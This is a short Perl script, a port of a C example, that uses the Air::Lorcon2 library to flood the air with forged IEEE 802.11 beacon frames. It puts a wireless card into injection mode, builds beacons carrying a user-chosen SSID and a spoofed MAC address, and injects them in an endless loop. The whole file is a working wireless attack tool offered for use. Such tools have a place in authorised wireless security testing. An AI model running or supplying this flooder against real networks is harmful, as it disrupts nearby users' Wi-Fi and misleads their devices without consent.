#!/usr/bin/perl

# Made by Edoardo Mantovani, 2020

#	Perl version of beacon_flood_lcpa.c (original author: brad.antoniewicz@foundstone.com)
#	simple IEEE 802.11 beacon flooder using Air::lorcon2 
#	packet assembly functionality

use strict;
use warnings;
use Air::Lorcon2 qw( :lorcon );

my $SSID = shift or die "./beacon_flood_lcpa.pl <SSID> <interface> <driver> <channel>\n";
my $interface = shift or die "./beacon_flood_lcpa.pl <SSID> <interface> <driver> <channel>\n";
my $driver = shift or die "./beacon_flood_lcpa.pl <SSID> <interface> <driver> <channel>\n";
my $channel = shift or die "./beacon_flood_lcpa.pl <SSID> <interface> <driver> <channel>\n";

my $mac  = "\x00\xDE\xAD\xBE\xEF\x00";

my $rates = "\x8c\x12\x98\x24\xb0\x48\x60\x6c"; 

my $Interval = 100;

my $capabilities = 0x0421;

# create lorcon context

my $drv = Air::Lorcon2::lorcon_find_driver( $driver ) or die $!; 
my $context = Air::Lorcon2::lorcon_create( $interface, $driver ) or die $!;

Air::Lorcon2::lorcon_open_injmon( $context ) or die Air::Lorcon2::lorcon_get_error( $context );
print "Current VAP is: " . Air::Lorcon2::lorcon_get_vap( $context );

# set the channel

Air::Lorcon2::lorcon_set_channel( $context, $channel ) or die Air::Lorcon2::lorcon_get_error( $context );

# flooding part

while(1){
	my $timestamp = time * 1000; # implement better
	my $meta = Air::Lorcon2::lcpa_init(); # create lcpa instance
	Air::Lorcon2::lcpf_beacon( $meta, $mac, $mac, "0x00", "0x00", "0x00", "0x00", $timestamp, $Interval, $capabilities);
	Air::Lorcon2::lcpf_add_ie( $meta, 0, length( $SSID ), $SSID ); 
	Air::Lorcon2::lcpf_add_ie( $meta, 1, ( length( $rates ) -1 ), \$rates);
	Air::Lorcon2::lcpf_add_ie( $meta, 3, 1, \$channel);
# Append IE Tags 42/47 for ERP Info 
	Air::Lorcon2::lcpf_add_ie( $meta, 42, 1, "\x05");
	Air::Lorcon2::lcpf_add_ie( $meta, 47, 1, "\x05");
# Convert Lorcon metapack to lorcon packet	
	my $packet = Air::Lorcon2::lorcon_packet_from_lcpa( $context, $meta );
	Air::Lorcon2::lorcon_inject( $context, $packet ) or die Air::Lorcon2::lorcon_get_error( $context );
	print "Hit CTRL + C to stop...\r";
	Air::Lorcon2::lcpa_free( $meta );
}


Air::Lorcon2::lorcon_close( $context );
Air::Lorcon2::lorcon_free( $context );
